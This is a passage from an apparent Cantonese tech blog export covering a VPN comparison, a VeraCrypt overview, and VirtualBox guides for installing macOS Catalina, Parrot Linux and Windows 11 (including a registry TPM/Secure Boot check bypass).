<h3 id="更多資料"><a href="#更多資料" class="headerlink" title="更多資料"></a>更多資料</h3><ol>
<li>同 NordVPN 已經合左併。<br> <a href="https://www.techradar.com/news/surfshark-founder-reveals-ties-to-nordvpn-and-tesonet">https://www.techradar.com/news/surfshark-founder-reveals-ties-to-nordvpn-and-tesonet</a>    </li>
<li>之前幫 TVB 賣廣告</li>
</ol>
<p>單單係呢二樣野已經夠哂理由唔用佢。</p>
<hr style="border:2px solid grey"></hr>

<h2 id="2-Nord-VPN"><a href="#2-Nord-VPN" class="headerlink" title="2. Nord VPN"></a>2. <a href="https://nordvpn.com/">Nord VPN</a></h2><img src="nord-d.jpg"/>

<p>推薦: None<br>安全: None<br>速度: None<br>隱定: None</p>
<p>Q: 我有冇用過？<br>A: 冇，個底花到咁，唔會考慮用。</p>
<h3 id="更多資料-1"><a href="#更多資料-1" class="headerlink" title="更多資料"></a>更多資料</h3><ol>
<li>成撚日俾人 Hack，大量 zombie AC 流出。<br><a href="https://www.cnet.com/tech/services-and-software/nordvpn-user-accounts-were-compromised-and-passwords-exposed-report-says/">https://www.cnet.com/tech/services-and-software/nordvpn-user-accounts-were-compromised-and-passwords-exposed-report-says/</a></li>
</ol>
<p>單單係呢點已經可以唔洗考慮用，<br>仲用佢既真係自求多福。</p>
<hr style="border:2px solid grey"></hr>

<h2 id="3-Proton-VPN"><a href="#3-Proton-VPN" class="headerlink" title="3. Proton VPN"></a>3. <a href="https://protonvpn.com/">Proton VPN</a></h2><img src ="protonvpn.png"/>

<p>推薦: ⭐⭐⭐⭐<br>安全: ⭐⭐⭐⭐⭐<br>速度: None<br>隱定: None</p>
<p>Q: 我有冇用過？<br>A: 有</p>
<p>Q: 用左幾耐？<br>A: 我係用佢個 Free Version，正常上到網，速度唔算差 (以免費版黎講)，用左年幾。</p>
<h3 id="更多資料-2"><a href="#更多資料-2" class="headerlink" title="更多資料"></a>更多資料</h3><p>呢間本身都係有出 Email 服務 <a href="https://protonmail.com/">ProtonMail</a><br>係以加密服務為主，安全性問題都唔太擔心。</p>
<p>另外，ProtonMail 的隱私報告顯示，他們在 2020 年間收到了 3,572 宗來自瑞士執法機關的用戶查詢，當中 3,017 宗有提供協助。<br><a href="https://lihkg.com/thread/2691521/page/1">https://lihkg.com/thread/2691521/page/1</a></p>
<h2 id="4-Mullvad-VPN"><a href="#4-Mullvad-VPN" class="headerlink" title="4. Mullvad VPN"></a>4. <a href="https://mullvad.net/en/">Mullvad VPN</a></h2><img src="/2022/02/08/VPN-List/mullvad.png" class="">

<p>推薦: ⭐⭐⭐⭐⭐<br>安全: ⭐⭐⭐⭐⭐<br>速度: ⭐⭐⭐⭐⭐<br>隱定: ⭐⭐⭐⭐⭐</p>
<p>Q: 我有冇用過？<br>A: 有</p>
<p>Q: 暫時係第4個月，感覺非常好。</p>
<p>首先，呢一款真係可以話係 VPN 入既 既清泉。</p>
<h3 id="no-log-policy"><a href="#no-log-policy" class="headerlink" title="no-log policy"></a>no-log policy</h3><p>唔會留任何記錄。</p>
<p><a href="https://mullvad.net/en/help/no-logging-data-policy/">https://mullvad.net/en/help/no-logging-data-policy/</a></p>
<h3 id="唔洗-Email-唔洗電話"><a href="#唔洗-Email-唔洗電話" class="headerlink" title="唔洗 Email 唔洗電話"></a>唔洗 Email 唔洗電話</h3><p>Mullvad 係會即時幫你 Gen 一個 ID 出黎，<br>呢個 ID 就係你既 登入帳號既野。</p>
<img src="/2022/02/08/VPN-List/gen-mullvad.png" class="">

<h3 id="支持多種俾錢方法"><a href="#支持多種俾錢方法" class="headerlink" title="支持多種俾錢方法"></a>支持多種俾錢方法</h3><p>官方仲話希望大家用 Anonymous 俾錢方法, eg Bitcoin。<br><a href="https://mullvad.net/en/blog/2019/7/24/cash-still-king/">https://mullvad.net/en/blog/2019/7/24/cash-still-king/</a></p>
<img src="/2022/02/08/VPN-List/pay-mullvad.png" class="">

<h3 id="零-Tracker"><a href="#零-Tracker" class="headerlink" title="零 Tracker"></a>零 Tracker</h3><p>喺 Tacker 方面係零。</p>
<img src="/2022/02/08/VPN-List/tracker-mullvad.png" class="">

<h3 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h3><p>雖然佢小 Server，但因為佢係 self-owned 先咁。<br><a href="https://mullvad.net/en/servers/">https://mullvad.net/en/servers/</a></p>
<h2 id="總結"><a href="#總結" class="headerlink" title="總結"></a>總結</h2><p>VPN 只屌 <a href="https://mullvad.net/en/">Mullvad VPN</a> 或者 <a href="https://protonvpn.com/">Proton VPN</a>。</p>
]]></content>
      <categories>
        <category>Review</category>
      </categories>
      <tags>
        <tag>VPN</tag>
      </tags>
  </entry>
  <entry>
    <title>VeraCrypt - 加密檔案和磁碟</title>
    <url>/2022/05/24/VeraCrypt-Apps/</url>
    <content><![CDATA[<p align="center">
    <img alt="VeraCrypt" src="cover.png" width="200px"/>
    <h1 align="center">VeraCrypt</h1>
</p>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>有啲野唔想俾人知道，<br>又或者你既 USB 唔想俾人見到入面有啲咩 files，<br>呢個時候你應該將你既 USB 加密，<br>咁樣就會多一層保護。</p>
<p>當嘗試放隻 USB 入去既時候，<br>就會要求輸入密碼。</p>
<p>VeraCrypt 可以加密 USB，成個系統，單一 disk。</p>
<h1 id="加密方法"><a href="#加密方法" class="headerlink" title="加密方法"></a>加密方法</h1><ul>
<li>AES–Twofish</li>
<li>AES–Twofish–Serpent</li>
<li>Camellia–Kuznyechik</li>
<li>Camellia–Serpent</li>
<li>Kuznyechik–AES</li>
<li>Kuznyechik–Serpent–Camellia</li>
<li>Kuznyechik–Twofish</li>
<li>Serpent–AES</li>
<li>Serpent–Twofish–AES</li>
<li>Twofish–Serpent</li>
</ul>
<h1 id="支援系統"><a href="#支援系統" class="headerlink" title="支援系統"></a>支援系統</h1><ul>
<li>Linux</li>
<li>Windows</li>
<li>Mac</li>
</ul>
<h1 id="官網"><a href="#官網" class="headerlink" title="官網"></a>官網</h1><ul>
<li><a href="https://www.veracrypt.fr/code/VeraCrypt/">https://www.veracrypt.fr/code/VeraCrypt/</a></li>
</ul>
<h1 id="程式圖片"><a href="#程式圖片" class="headerlink" title="程式圖片"></a>程式圖片</h1><img src="/2022/05/24/VeraCrypt-Apps/PROGRAM.png" class="">
<img src="/2022/05/24/VeraCrypt-Apps/PROGRAM-2.png" class="">
<img src="/2022/05/24/VeraCrypt-Apps/PROGRAM-3.png" class="">]]></content>
      <categories>
        <category>Encrypt</category>
      </categories>
      <tags>
        <tag>Security</tag>
      </tags>
  </entry>
  <entry>
    <title>VirtualBox - 安裝 MacOS Catalina</title>
    <url>/2022/01/16/VirtualBox-Install-MacOS-Catalina/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>喺開始之前，我地需要下載呢個檔案</p>
<ul>
<li><a href="https://www.mediafire.com/file/k4oxqh0avqe7uy1/MAC.rar/file">MacOS Catalina vmdk Files</a></li>
</ul>
<p>下載左之後，我地開 VirtualBox 開 Create 個新既</p>
<center>
名就你鐘意起乜就起乜
<img src="/2022/01/16/VirtualBox-Install-MacOS-Catalina/1.png" class="">


<p>選擇你想要既 Ram 既大小</p>
<p>1GB = 1024 MB<br>1024 * 4 = 4096<br>所以 4GB Ram = 4096</p>
<img src="/2022/01/16/VirtualBox-Install-MacOS-Catalina/4096.png" class="">


<p>呢度我地選擇第3個<br>“使用現有虛擬硬碟檔案(U)”</p>
<p>選擇返我地岩岩下載完既 vmdk 檔 </p>
<img src="/2022/01/16/VirtualBox-Install-MacOS-Catalina/vmdk.png" class="">

<p>選擇 VDI<br>選擇返我地岩岩下載完既 vmdk 檔</p>
<img src="/2022/01/16/VirtualBox-Install-MacOS-Catalina/VDI.png" class="">

<p>選擇第一個 動態分配</p>
<img src="/2022/01/16/VirtualBox-Install-MacOS-Catalina/AN.png" class="">

<p>打你要既 HardDisk 大小</p>
<img src="/2022/01/16/VirtualBox-Install-MacOS-Catalina/harddisk.png" class="">

<p>然後入部機既 Setting &gt; 一般 &gt;<br>將共用剪貼簿同拖放改做雙向</p>
<img src="/2022/01/16/VirtualBox-Install-MacOS-Catalina/d.png" class="">

<p>再黎入去 系統 &gt; 主機版<br>將開機順序既 <code>軟碟</code> <code>光碟</code> Tick 走佢唔要</p>
<img src="/2022/01/16/VirtualBox-Install-MacOS-Catalina/system.png" class="">

<p>再黎入去 系統 &gt; 虛理器<br>將虛理器既 CPU 改做 4</p>
<img src="/2022/01/16/VirtualBox-Install-MacOS-Catalina/cpu-4.png" class="">

<p>再黎入去 顯示 &gt; 畫面<br>將 視訊記憶體改做 128 MB<br>再將 圖形控制器 改做 VBoxSVGA</p>
<img src="/2022/01/16/VirtualBox-Install-MacOS-Catalina/SVGA-128.png" class="">

</center>

<p>然後開你既 PowerShell CD 入去 你安裝既 VirtualBox 位置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Now Paths is c:\</span></span><br><span class="line"><span class="built_in">cd</span> <span class="string">&quot;C:\Program Files\Oracle\VirtualBox\&quot;</span></span><br></pre></td></tr></table></figure>

<p>再打呢6句野，<br>注意，Your VM Name 係要改返做你起既 VM 名稱</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.\VBoxManage.exe modifyvm <span class="string">&quot;Your VM Name&quot;</span> --cpuidset 00000001 000106e5 00100800 0098e3fd bfebfbff</span><br><span class="line">.\VBoxManage.exe setextradata <span class="string">&quot;Your VM Name&quot;</span> <span class="string">&quot;VBoxInternal/Devices/efi/0/Config/DmiSystemProduct&quot;</span> <span class="string">&quot;iMac11,3&quot;</span></span><br><span class="line">.\VBoxManage.exe setextradata <span class="string">&quot;Your VM Name&quot;</span> <span class="string">&quot;VBoxInternal/Devices/efi/0/Config/DmiSystemVersion&quot;</span> <span class="string">&quot;1.0&quot;</span></span><br><span class="line">.\VBoxManage.exe setextradata <span class="string">&quot;Your VM Name&quot;</span> <span class="string">&quot;VBoxInternal/Devices/efi/0/Config/DmiBoardProduct&quot;</span> <span class="string">&quot;Iloveapple&quot;</span></span><br><span class="line">.\VBoxManage.exe setextradata <span class="string">&quot;Your VM Name&quot;</span> <span class="string">&quot;VBoxInternal/Devices/smc/0/Config/DeviceKey&quot;</span> <span class="string">&quot;ourhardworkbythesewordsguardedpleasedontsteal(c)AppleComputerInc&quot;</span></span><br><span class="line">.\VBoxManage.exe setextradata <span class="string">&quot;Your VM Name&quot;</span> <span class="string">&quot;VBoxInternal/Devices/smc/0/Config/GetKeyFromRealSMC&quot;</span> 1</span><br></pre></td></tr></table></figure>

<img src="/2022/01/16/VirtualBox-Install-MacOS-Catalina/DONE-OPEN.png" class="">
<p>完成左之後你就可以開你部機試下，就會成功 Run 到。</p>
<img src="/2022/01/16/VirtualBox-Install-MacOS-Catalina/DONE-OPEN-2.png" class="">


<p>參考資料:<br><a href="https://www.youtube.com/watch?v=3LYgwi4Bm1w">https://www.youtube.com/watch?v=3LYgwi4Bm1w</a><br><a href="https://www.dev2qa.com/how-to-install-macos-on-virtualbox-in-windows-10/">https://www.dev2qa.com/how-to-install-macos-on-virtualbox-in-windows-10/</a></p>
]]></content>
      <categories>
        <category>VirtualBox</category>
        <category>MacOS</category>
      </categories>
      <tags>
        <tag>安裝</tag>
      </tags>
  </entry>
  <entry>
    <title>VirtualBox - 安裝 Parrot Linux</title>
    <url>/2022/06/07/VirtualBox-Install-ParrotLinux/</url>
    <content><![CDATA[<img src="cover.png" width="250px"/>

<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Parrot 係一款用黎主要做 Penetration Testing 既系統，<br>今日講下點樣下載 Parrot Linux 喺你既 VirtualBox 入面，<br>至於點樣開個新既 VirtualBox 就唔喺度講，<br>可以睇返之前既文。</p>
<h2 id="下載-iso-檔案"><a href="#下載-iso-檔案" class="headerlink" title="下載 iso 檔案"></a>下載 iso 檔案</h2><p>首先去官網下載 iso 檔案先，<br>兩個版本都冇乜所謂。</p>
<ul>
<li>Home Edition</li>
<li>Security Edition</li>
</ul>
<p><a href="https://www.parrotsec.org/download/">https://www.parrotsec.org/download/</a></p>
<img src="/2022/06/07/VirtualBox-Install-ParrotLinux/page.png" class="">

<h2 id="進入"><a href="#進入" class="headerlink" title="進入"></a>進入</h2><p>入左去之後係用你既鍵盤 上下左右箭嘴 進行操作，<br>我地撳 Try / Install</p>
<img src="/2022/06/07/VirtualBox-Install-ParrotLinux/1.png" class="">

<p>…. Loading</p>
<img src="/2022/06/07/VirtualBox-Install-ParrotLinux/2.png" class="">

<p>入到黎之後會發現個 Screen 好細。</p>
<img src="/2022/06/07/VirtualBox-Install-ParrotLinux/3.png" class="">

<p>我地撳 <code>Host + F</code> 開啟 Full Screen。</p>
<img src="/2022/06/07/VirtualBox-Install-ParrotLinux/4.png" class="">

<h2 id="安裝-系統語言選擇"><a href="#安裝-系統語言選擇" class="headerlink" title="安裝 (系統語言選擇)"></a>安裝 (系統語言選擇)</h2><p>而加喺你既 Desktop 搵 <code>Install Parrot</code>，<br>再將佢打開，<br>打開後佢會叫你揀 Languages，<br>我會用 英文 (美國)，<br>然後再 Next。</p>
<img src="/2022/06/07/VirtualBox-Install-ParrotLinux/5.png" class="">


<h2 id="安裝-國家選擇"><a href="#安裝-國家選擇" class="headerlink" title="安裝 (國家選擇)"></a>安裝 (國家選擇)</h2><p>因為你上面係揀左美國，<br>咁下一個選擇佢就幫你自動揀左國家係美國，<br>我地轉返佢做你想要既國家。</p>
<img src="/2022/06/07/VirtualBox-Install-ParrotLinux/6.png" class="">

<h2 id="安裝-鍵盤設置"><a href="#安裝-鍵盤設置" class="headerlink" title="安裝 (鍵盤設置)"></a>安裝 (鍵盤設置)</h2><p>呢度可以唔洗郁，<br>因為我地平時用緊既 Keyboard 就係 <code>105-key</code>，<br>或者如果你唔係既話可以再自己轉，<br>但係我唔轉喇，<br>撳 Next。</p>
<img src="/2022/06/07/VirtualBox-Install-ParrotLinux/7.png" class="">

<h2 id="安裝-選擇系統安裝位置"><a href="#安裝-選擇系統安裝位置" class="headerlink" title="安裝 (選擇系統安裝位置)"></a>安裝 (選擇系統安裝位置)</h2><p>喺安裝既過程，<br>實體機同虛擬機既最大分別就係呢個位，<br>因為你實體機通常都係要雙系統先要郁呢個位 (係最重要既位置)，<br>而你既虛擬機係唔需要搞咁多野，<br>因為呢個虛擬硬碟得一個，<br>冇其他野 (除非你改左野)。</p>
<p>我地撳 <code>Erase Disk</code><br>將所有野刪除再安裝。</p>
<p>然後呢度會有個 <code>Encrypt system</code><br>可做可唔做，<br>呢度 Tick 左之後會要求你打密碼，<br>然後每次你都要打岩密碼先至入到個系統，<br>但係我唔需要呢啲，<br>所以我 Next了。</p>
<img src="/2022/06/07/VirtualBox-Install-ParrotLinux/8.png" class="">

<h2 id="安裝-用戶設置"><a href="#安裝-用戶設置" class="headerlink" title="安裝 (用戶設置)"></a>安裝 (用戶設置)</h2><p>呢度打返你想起既密碼，用戶名就可以下一步。</p>
<img src="/2022/06/07/VirtualBox-Install-ParrotLinux/9.png" class="">

<h2 id="安裝-確定你輸入的內容"><a href="#安裝-確定你輸入的內容" class="headerlink" title="安裝 (確定你輸入的內容)"></a>安裝 (確定你輸入的內容)</h2><p>呢度係確定返你上面啲野，<br>確保係冇錯就可以撳 <code>Install</code></p>
<img src="/2022/06/07/VirtualBox-Install-ParrotLinux/10.png" class="">

<h3 id="安裝-二次確定"><a href="#安裝-二次確定" class="headerlink" title="安裝 (二次確定)"></a>安裝 (二次確定)</h3><p>撳 <code>Install now</code></p>
<img src="/2022/06/07/VirtualBox-Install-ParrotLinux/11.png" class="">

<h2 id="真係裝喇"><a href="#真係裝喇" class="headerlink" title="真係裝喇"></a>真係裝喇</h2><p>而加只需要等佢自己裝好哂。</p>
<img src="/2022/06/07/VirtualBox-Install-ParrotLinux/12.png" class="">

<h2 id="安裝完成"><a href="#安裝完成" class="headerlink" title="安裝完成"></a>安裝完成</h2><p>見到呢個畫面就係代表已經裝好，<br>撳 <code>Done</code> 重新開機。</p>
<img src="/2022/06/07/VirtualBox-Install-ParrotLinux/done.png" class="">

<h3 id="移除存放裝置-iso"><a href="#移除存放裝置-iso" class="headerlink" title="移除存放裝置 iso"></a>移除存放裝置 iso</h3><p>呢個位我地要將原本既 iso 移除左佢，<br>以免之後佢入左你隻 iso 先，<br>唔咁做就會一直都會係安裝畫面。</p>
<p>步驟:<br>對住你既 vm 右鍵 &gt; 設定 &gt; 存放裝置 &gt; 控制制 IDE &gt; 對住個 ISO 右鍵 &gt; 移除附件 &gt; 移除。</p>
<img src="/2022/06/07/VirtualBox-Install-ParrotLinux/settings.gif" class="">

<h3 id="開機測試"><a href="#開機測試" class="headerlink" title="開機測試"></a>開機測試</h3><p>當你完成左移除 iso 後，<br>我地再試下開機睇下成唔成功。</p>
<p>當你見到呢個畫面既時候，<br>就成功了。</p>
<img src="/2022/06/07/VirtualBox-Install-ParrotLinux/yeah.png" class="">
<img src="/2022/06/07/VirtualBox-Install-ParrotLinux/yeahh.png" class="">

<h3 id="登入"><a href="#登入" class="headerlink" title="登入"></a>登入</h3><p>入返你岩岩打左既密碼。</p>
<img src="/2022/06/07/VirtualBox-Install-ParrotLinux/yeahhh.png" class="">

<h3 id="成功安裝"><a href="#成功安裝" class="headerlink" title="成功安裝"></a>成功安裝</h3><p>得左 A_A</p>
<img src="/2022/06/07/VirtualBox-Install-ParrotLinux/yo.png" class="">]]></content>
      <categories>
        <category>VirtualBox</category>
        <category>Parrot</category>
      </categories>
      <tags>
        <tag>Parrot</tag>
      </tags>
  </entry>
  <entry>
    <title>VirtualBox - 快捷鍵</title>
    <url>/2022/01/16/VirtualBox-Shortkeys/</url>
    <content><![CDATA[<img src="/img/Post/image/VirtualBox/logo.png" width="200px"/>

<h1 id="VirtualBox-快捷鍵"><a href="#VirtualBox-快捷鍵" class="headerlink" title="VirtualBox 快捷鍵"></a>VirtualBox 快捷鍵</h1><p>使用快捷鍵有助你節省多餘尋找要找的位置在那裡。</p>
<h2 id="顯示幫助"><a href="#顯示幫助" class="headerlink" title="顯示幫助"></a>顯示幫助</h2><pre><code>F1
</code></pre>
<img src="/2022/01/16/VirtualBox-Shortkeys/f1.png" class="">

<h2 id="虛擬媒體管理器。"><a href="#虛擬媒體管理器。" class="headerlink" title="虛擬媒體管理器。"></a>虛擬媒體管理器。</h2><p>Ctrl + D</p>
<img src="/2022/01/16/VirtualBox-Shortkeys/c+d.png" class="">

<h2 id="VirtualBox-Preferences"><a href="#VirtualBox-Preferences" class="headerlink" title="VirtualBox Preferences"></a>VirtualBox Preferences</h2><p>Ctrl + G</p>


<h2 id="Serach"><a href="#Serach" class="headerlink" title="Serach"></a>Serach</h2><p>Ctrl + S</p>
<h2 id="導入虛擬化服務"><a href="#導入虛擬化服務" class="headerlink" title="導入虛擬化服務"></a>導入虛擬化服務</h2><p>Ctrl + I</p>
<h2 id="導出虛擬化服務"><a href="#導出虛擬化服務" class="headerlink" title="導出虛擬化服務"></a>導出虛擬化服務</h2><p>Ctrl + E</p>
<h2 id="顯示虛擬機的事件歷史"><a href="#顯示虛擬機的事件歷史" class="headerlink" title="顯示虛擬機的事件歷史"></a>顯示虛擬機的事件歷史</h2><p>Ctrl + L</p>
<h2 id="創建一個新的虛擬機"><a href="#創建一個新的虛擬機" class="headerlink" title="創建一個新的虛擬機"></a>創建一個新的虛擬機</h2><p>Ctrl + N</p>
<h2 id="暫停虛擬機"><a href="#暫停虛擬機" class="headerlink" title="暫停虛擬機"></a>暫停虛擬機</h2><p>Ctrl + P</p>
<h2 id="刪除虛擬機"><a href="#刪除虛擬機" class="headerlink" title="刪除虛擬機"></a>刪除虛擬機</h2><p>Ctrl + R</p>
<h2 id="退出應用程序"><a href="#退出應用程序" class="headerlink" title="退出應用程序"></a>退出應用程序</h2><p>Ctrl + Q</p>
<h2 id="會話鎖定"><a href="#會話鎖定" class="headerlink" title="會話鎖定"></a>會話鎖定</h2><p>Ctrl + Alt + L</p>
<h2 id="在不同的辦公桌之間移動"><a href="#在不同的辦公桌之間移動" class="headerlink" title="在不同的辦公桌之間移動"></a>在不同的辦公桌之間移動</h2><p>Ctrl + Alt + ⬆ 或 ⬇</p>
<h2 id="放置桌子，將一張放在另一張的頂部或下方"><a href="#放置桌子，將一張放在另一張的頂部或下方" class="headerlink" title="放置桌子，將一張放在另一張的頂部或下方"></a>放置桌子，將一張放在另一張的頂部或下方</h2><p>Ctrl + Alt + Shift + ⬆ 或 ⬇</p>
<h2 id="打開一個新終端"><a href="#打開一個新終端" class="headerlink" title="打開一個新終端"></a>打開一個新終端</h2><p>Ctrl + Alt + T</p>
<h2 id="系統組件之間交替"><a href="#系統組件之間交替" class="headerlink" title="系統組件之間交替"></a>系統組件之間交替</h2><p>Ctrl + Alt + Tab</p>
<h2 id="最大化或最小化窗口"><a href="#最大化或最小化窗口" class="headerlink" title="最大化或最小化窗口"></a>最大化或最小化窗口</h2><p>Ctrl + Windows + ⬆ 或 ⬇</p>
<h2 id="顯示當前桌面"><a href="#顯示當前桌面" class="headerlink" title="顯示當前桌面"></a>顯示當前桌面</h2><p>Ctrl + Windows + D</p>
<h1 id="Host-快捷鍵"><a href="#Host-快捷鍵" class="headerlink" title="Host 快捷鍵"></a>Host 快捷鍵</h1><h2 id="ScreenShot"><a href="#ScreenShot" class="headerlink" title="ScreenShot"></a>ScreenShot</h2><p>Host + e</p>
<p>參考資料:<br><a href="https://hardwaresfera.com/en/articulos/atajos-teclado-virtualbox/">https://hardwaresfera.com/en/articulos/atajos-teclado-virtualbox/</a></p>
]]></content>
      <categories>
        <category>VirtualBox</category>
      </categories>
      <tags>
        <tag>Shortkeys</tag>
      </tags>
  </entry>
  <entry>
    <title>VirtualBox - 啟動 USB, Cam</title>
    <url>/2022/06/11/VirtualBox-enabled-USB-Cam/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>要喺 VirtualBox 入面用你係實機度插入左既 Cam, USB，<br>我地需要喺官網下載佢既 Extensions。</p>
<h2 id="下載"><a href="#下載" class="headerlink" title="下載"></a>下載</h2><p>入去呢個網站然後搵 <code>VirtualBox Extension Pack</code> 再將佢下載。</p>
<ul>
<li><a href="https://www.virtualbox.org/wiki/Downloads">https://www.virtualbox.org/wiki/Downloads</a></li>
</ul>
<img src="/2022/06/11/VirtualBox-enabled-USB-Cam/download.png" class="">

<h2 id="安裝"><a href="#安裝" class="headerlink" title="安裝"></a>安裝</h2><p>我地需要用官理員身份開呢舊野，<br>但係 Windows 機係冇得右鍵用官理員身份開呢舊野，<br>我地需要用指令開呢舊野。</p>
<p>Windows 可以 用 gsudo 開。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo .\Oracle_VM_VirtualBox_Extension_Pack-6.1.34.vbox-extpack</span><br></pre></td></tr></table></figure>

<p>如果冇裝就用 Powershell 用官理員身份開。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">.\Oracle_VM_VirtualBox_Extension_Pack-6.1.34.vbox-extpack</span><br></pre></td></tr></table></figure>

<h3 id="install"><a href="#install" class="headerlink" title="install"></a>install</h3><p>開到你會見到呢個畫面，<br>我地撳 <code>install</code></p>
<img src="/2022/06/11/VirtualBox-enabled-USB-Cam/install.png" class="">

<h3 id="Agree"><a href="#Agree" class="headerlink" title="Agree"></a>Agree</h3><p>拉落去然後再撳 <code>Agree</code>，<br>之後就會開始安裝。</p>
<img src="/2022/06/11/VirtualBox-enabled-USB-Cam/agree.png" class="">

<h3 id="OK"><a href="#OK" class="headerlink" title="OK"></a>OK</h3><p>完成安裝，<br>之後請重新開你部機，<br>然後你喺 <code>Device</code> 度就會發現多左 USB,CAM 呢D選擇。</p>
<img src="/2022/06/11/VirtualBox-enabled-USB-Cam/done.png" class="">]]></content>
      <categories>
        <category>VirtualBox</category>
      </categories>
      <tags>
        <tag>Gui</tag>
      </tags>
  </entry>
  <entry>
    <title>VirtualBox - 安裝 Windows 11</title>
    <url>/2022/01/21/VirtualBox-install-windows-11/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>喺 VirtualBox 入面 安裝 Windows 11 會有硬件問題，<br>佢係未可以做到最低硬件要求，<br>咁我地要入 regedit 加一加野。</p>
<h1 id="需要"><a href="#需要" class="headerlink" title="需要"></a>需要</h1><ul>
<li><a href="https://www.microsoft.com/zh-tw/software-download/windows11">Windows 11 ISO</a></li>
<li><a href="https://www.virtualbox.org/">VirtualBox</a></li>
</ul>
<h1 id="下載-Windows-11-ISO"><a href="#下載-Windows-11-ISO" class="headerlink" title="下載 Windows 11 ISO"></a>下載 Windows 11 ISO</h1><ul>
<li><a href="https://www.microsoft.com/zh-tw/software-download/windows11">https://www.microsoft.com/zh-tw/software-download/windows11</a></li>
</ul>
<img src="/2022/01/21/VirtualBox-install-windows-11/Windows%2011%20iso%20Download.gif" class="">

<h1 id="開始"><a href="#開始" class="headerlink" title="開始"></a>開始</h1><center>
新增一個虛擬機。
<img src="/2022/01/21/VirtualBox-install-windows-11/1.png" class="">

<p>揀你要幾多 Ram。</p>
<img src="/2022/01/21/VirtualBox-install-windows-11/2.png" class="">

<p>立即建立虛擬硬碟</p>
<img src="/2022/01/21/VirtualBox-install-windows-11/3.png" class="">

<p>揀硬硬碟既類型 VDI</p>
<img src="/2022/01/21/VirtualBox-install-windows-11/4.png" class="">

<p>動態分配</p>
<img src="/2022/01/21/VirtualBox-install-windows-11/5.png" class="">

<p>揀你要幾大 HardDisk 之後撳建立。</p>
<img src="/2022/01/21/VirtualBox-install-windows-11/6.png" class="">

<p>你就會發現多左個，然後我地對住舊野撳兩下開左佢。</p>
<img src="/2022/01/21/VirtualBox-install-windows-11/7.png" class="">

<p>揀返你岩岩下載既 Windows 11 iso檔，再撳開始。</p>
<img src="/2022/01/21/VirtualBox-install-windows-11/8.png" class="">

<p>開左之後，是但撳一粒制入 Windows。</p>
<img src="/2022/01/21/VirtualBox-install-windows-11/9.png" class="">

<p>Loading…</p>
<img src="/2022/01/21/VirtualBox-install-windows-11/10.png" class="">

<p>揀你想要既 Lang，輸入法。</p>
<img src="/2022/01/21/VirtualBox-install-windows-11/11.png" class="">

<p>立即安裝</p>
<img src="/2022/01/21/VirtualBox-install-windows-11/12.png" class="">

<p>撳 <code>我沒有產品金鎖</code></p>
<img src="/2022/01/21/VirtualBox-install-windows-11/13.png" class="">

<p>呢度我建議用專業版，<br>家用同專業既最大分別係，<br>你用家用要Login左 MS Account先可以入去，然後入到去先可以改，<br>而專業就係你可以用 offline Account 直接入去，<br>所以我呢度會用專業版。</p>
<img src="/2022/01/21/VirtualBox-install-windows-11/14.png" class="">

<p>撳左下一步你會發現話你部機唔 Support，但唔緊要<br>呢度我地要幫部機改小小野。</p>
<img src="/2022/01/21/VirtualBox-install-windows-11/15.png" class="">

<p>我地撳 <code>Shift + F10</code> 開 cmd 出黎，然後再打 <code>regedit</code></p>
<img src="/2022/01/21/VirtualBox-install-windows-11/regedit.gif" class="">

<p>去 <code>HKEY_LOCAL_MACHINE</code> &gt; <code>SYSTEM</code> &gt; <code>Setup</code></p>
<img src="/2022/01/21/VirtualBox-install-windows-11/regedit-2.gif" class="">

<p>新增一個 機碼叫 <code>LabConfig</code> (留意大細楷)</p>
<img src="/2022/01/21/VirtualBox-install-windows-11/regedit-3.gif" class="">

<p>入面加一個 <code>DWORD 32bit</code> 個名叫 <code>BypassTPMCheck</code> 入面既數值再改做 1</p>
<img src="/2022/01/21/VirtualBox-install-windows-11/regedit-BypassTPMCheck.gif" class="">

<p>再加一個，不過呢次個名改做 <code>BypassSecureBootCheck</code> 數值都係 1</p>
<img src="/2022/01/21/VirtualBox-install-windows-11/regedit-BypassSecureBootCheck.gif" class="">

<p>完成，熄左而加個 Windows 再撳多次 立即安裝就得。</p>
<img src="/2022/01/21/VirtualBox-install-windows-11/done.gif" class="">

<p>Loading…</p>
<img src="/2022/01/21/VirtualBox-install-windows-11/hello.png" class="">

<p>一開始會問你想用既國家位置。</p>
<img src="/2022/01/21/VirtualBox-install-windows-11/yo.png" class="">

<p>揀輸入法。</p>
<img src="/2022/01/21/VirtualBox-install-windows-11/yo-2.png" class="">

<p>跳過，唔需要。</p>
<img src="/2022/01/21/VirtualBox-install-windows-11/yo-3.png" class="">

<p>loading …</p>
<img src="/2022/01/21/VirtualBox-install-windows-11/yo-4.png" class="">

<p>可以打可以唔打，識別機名用。</p>
<img src="/2022/01/21/VirtualBox-install-windows-11/yo-5.png" class="">

<p>呢邊我用 Offline Account。</p>
<img src="/2022/01/21/VirtualBox-install-windows-11/name-settings.gif" class="">

<p>起你部機既名。</p>
<img src="/2022/01/21/VirtualBox-install-windows-11/yo-6.png" class="">

<p>你部機既密碼。</p>
<img src="/2022/01/21/VirtualBox-install-windows-11/yo-7.png" class="">

<p>打多次個密碼。</p>
<img src="/2022/01/21/VirtualBox-install-windows-11/yo-8.png" class="">

<p>安全性問題一。 (你記得就好，亂咁填都冇所謂。)</p>
<img src="/2022/01/21/VirtualBox-install-windows-11/yo-9.png" class="">

<p>安全性問題二。 (你記得就好，亂咁填都冇所謂。)</p>
<img src="/2022/01/21/VirtualBox-install-windows-11/yo-10.png" class="">

<p>安全性問題三。 (你記得就好，亂咁填都冇所謂。)</p>
<img src="/2022/01/21/VirtualBox-install-windows-11/yo-11.png" class="">

<p>loading …</p>
<img src="/2022/01/21/VirtualBox-install-windows-11/yo-12.png" class="">

<p>私隱設定 (建議全部唔好開。)</p>
<img src="/2022/01/21/VirtualBox-install-windows-11/yo-13.png" class="">

